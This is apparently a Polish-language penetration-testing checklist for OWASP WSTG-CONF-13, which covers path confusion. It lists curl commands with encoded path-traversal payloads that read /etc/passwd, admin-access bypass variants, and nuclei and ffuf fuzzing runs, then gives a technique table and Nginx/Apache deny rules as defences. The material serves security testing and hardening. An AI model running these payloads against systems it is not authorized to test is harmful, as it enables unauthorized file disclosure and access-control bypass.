# WSTG-CONF-13 — Test Path Confusion

## Cele

- Make sure application paths are configured correctly
- Test URL normalization and path traversal variants
- Identify path confusion vulnerabilities that bypass security controls

## KOMENDY

### Testowanie path traversal

```bash
curl -s https://TARGET/..%2f..%2fetc/passwd | head -5
curl -s https://TARGET/..;/admin | head -5
curl -s https://TARGET/..%252f..%252f | head -5
curl -s "https://TARGET/static/..;/admin" | head -5

```

### URL normalization tests

```bash
curl -sI https://TARGET/admin | head -1
curl -sI https://TARGET//admin | head -1
curl -sI https://TARGET/./admin | head -1
curl -sI https://TARGET/admin/ | head -1
curl -sI https://TARGET/admin/. | head -1
curl -sI https://TARGET/ADMIN | head -1
curl -sI https://TARGET/Admin | head -1
curl -sI "https://TARGET/admin%20" | head -1
curl -sI "https://TARGET/admin%00" | head -1

```

### Path traversal z podwojnym kodowaniem

```bash
curl -s "https://TARGET/%2e%2e/%2e%2e/etc/passwd" | head -5
curl -s "https://TARGET/%252e%252e/%252e%252e/etc/passwd" | head -5
curl -s "https://TARGET/..%c0%af..%c0%af/etc/passwd" | head -5
curl -s "https://TARGET/..%ef%bc%8f..%ef%bc%8f/etc/passwd" | head -5

```

### Bypass filtra sciezek

```bash
curl -sI "https://TARGET/admin..;/" | head -1
curl -sI "https://TARGET/admin;foo=bar" | head -1
curl -sI "https://TARGET/admin%23" | head -1
curl -sI "https://TARGET/admin%3f" | head -1

```

### Testowanie z roznym trailing

```bash
curl -sI https://TARGET/admin | head -1
curl -sI https://TARGET/admin/ | head -1
curl -sI https://TARGET/admin// | head -1
curl -sI https://TARGET/admin/./ | head -1
curl -sI https://TARGET/admin/..;/ | head -1

```

### Reverse proxy path confusion

```bash
curl -sI "https://TARGET/public/..;/admin" | head -1
curl -sI "https://TARGET/public/%2e%2e/admin" | head -1
curl -sI "https://TARGET/api/..;/admin" | head -1

```

### Nuclei - path confusion/traversal

```bash
nuclei -u https://TARGET -tags lfi -o output_nuclei_lfi.txt
nuclei -u https://TARGET -tags traversal -o output_nuclei_traversal.txt

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings - Directory Traversal payloads

```bash
ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/directory_traversal.txt" -mc 200 -o output_ffuf_traversal.json

ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/deep_traversal.txt" -mc 200 -o output_ffuf_deep_traversal.json

ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/dotdotpwn.txt" -mc 200 -o output_ffuf_dotdotpwn.json

ffuf -u "https://TARGET/FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt" -mc 200 -o output_ffuf_exotic_encoding.json

```

### Bug-Bounty-Wordlists 403 bypass payloads

```bash
ffuf -u "https://TARGET/adminFUZZ" -w Desktop/WSTG/Bug-Bounty-Wordlists-main/403_url_payloads.txt -mc 200 -o output_ffuf_403_bypass.json

```

### Bug-Bounty-Wordlists 403 header payloads

```bash
# Uzyj kazda linie jako naglowek do bypass
ffuf -u https://TARGET/admin -H "FUZZ" -w Desktop/WSTG/Bug-Bounty-Wordlists-main/403_header_payloads.txt -mc 200 -o output_ffuf_403_header_bypass.json

```

### SecLists reverse proxy inconsistencies

```bash
ffuf -u "https://TARGET/FUZZ" -w Desktop/WSTG/SecLists-master/Discovery/Web-Content/reverse-proxy-inconsistencies.txt -mc 200 -o output_ffuf_reverse_proxy.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Przetestuj rozne warianty sciezek w Burp Repeater (..;/, %2e%2e, podwojne kodowanie)
2. Sprawdz roznice w zachowaniu frontendu i backendu (reverse proxy confusion)
3. Testuj case sensitivity sciezek (Admin vs admin vs ADMIN)
4. Sprawdz czy trailing slash zmienia zachowanie (/admin vs /admin/)
5. Testuj null byte i inne specjalne znaki w sciezkach
6. Sprawdz czy mozna ominac kontrole dostepu przez path manipulation
7. Przetestuj path traversal do odczytu plikow systemowych
8. Zweryfikuj czy normalizacja URL jest spójna miedzy komponentami


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md, Attack_Surface_Analysis_Cheat_Sheet.md

### Path confusion — mechanizm

- Roznice w interpretacji sciezek miedzy **reverse proxy** (Nginx, Apache) a **backendem** (Tomcat, Node.js, Spring)
- Proxy moze uznac sciezke za publiczna, a backend interpretuje ja jako dostep do chronionego zasobu
- Kluczowe: normalizacja URL odbywa sie w roznych momentach na roznych komponentach

### Techniki path confusion

| Technika | Przyklad | Cel |
|----------|---------|-----|
| Path traversal | `/public/../admin` | Ominiecie kontroli dostepu |
| Semicolon (Tomcat/Jetty) | `/admin/..;/public` | Tomcat traktuje `;` jako separator parametrow sciezki |
| Double URL encoding | `%252e%252e%252f` | Bypass WAF — dekodowanie odbywa sie dwukrotnie |
| Null byte | `/admin%00.jpg` | Starsze serwery obcinaja po null byte |
| Backslash | `/admin\..\/public` | Windows IIS interpretuje `\` jak `/` |
| UTF-8 overlong | `%c0%af` = `/` | Bypass filtrow ASCII |
| Trailing dot/space | `/admin.` lub `/admin%20` | IIS ignoruje trailing dot/space |
| Double slash | `//admin` | Niektore proxy pomijaja reguly dla podwojnego slasha |

### Reverse proxy + backend — niespojnosci

| Scenariusz | Proxy widzi | Backend widzi |
|-----------|-------------|---------------|
| `/public/..;/admin` | `/public/..;/admin` (publiczne) | `/admin` (chronione) |
| `/admin/./` | `/admin/./` (block) | `/admin/` (normalizacja) |
| `/Admin` | `/Admin` (nie matchuje regule `/admin`) | `/admin` (case insensitive) |
| `//admin` | `//admin` (pomija regule) | `/admin` (normalizacja) |

### Konfiguracja — jak zapobiegac

**Nginx + backend:**
```
# Normalizuj sciezki PRZED przekazaniem do backendu
merge_slashes on;  # domyslnie wlaczone
# Blokuj path traversal
location ~* /\.\./ { return 403; }
# Blokuj semicolon
location ~* ; { return 403; }
```

**Apache:**
```
# Wlacz AllowEncodedSlashes Off (domyslnie)
AllowEncodedSlashes Off
# mod_security: blokuj path traversal
SecRule REQUEST_URI "\.\./" "id:1,deny,status:403"
```

### Obrona

- **Normalizuj sciezki** na proxy/WAF PRZED przekazaniem do backendu
- Testuj te same reguly dostepu na proxy I backendzie — nie polegaj na jednej warstwie
- Blokuj znaki specjalne w sciezkach: `..`, `;`, `%00`, `%2e`, `%2f` na wejsciu
- Uzyj **allowlist** sciezek zamiast denylist
- Upewnij sie ze proxy i backend uzywaja tego samego algorytmu normalizacji URL
- Testuj case sensitivity — jesli proxy jest case-sensitive a backend nie, to vulnerability

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Additional CORS Checks | Testowanie blednych konfiguracji CORS | [GitHub](https://github.com/ybieri/Additional_CORS_Checks) |
